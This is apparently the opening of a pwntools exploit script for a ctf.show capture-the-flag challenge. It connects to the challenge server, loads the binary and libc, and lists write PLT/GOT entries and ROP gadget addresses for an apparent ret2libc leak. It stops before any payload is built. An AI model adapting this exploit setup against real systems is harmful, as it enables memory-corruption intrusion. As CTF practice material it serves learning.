from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28112)
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
main = elf.sym['main']
ctfshow = elf.sym['ctfshow']
write_plt = elf.plt['write']
write_got = elf.got['write']
pop_rdi = 0x400803  # 0x0000000000400803 : pop rdi ; ret 
pop_rsi_r15 = 0x400801 # 0x0000000000400801 : pop rsi ; pop r15 ; ret
ret = 0x4004fe  # 0x00000000004004fe : ret
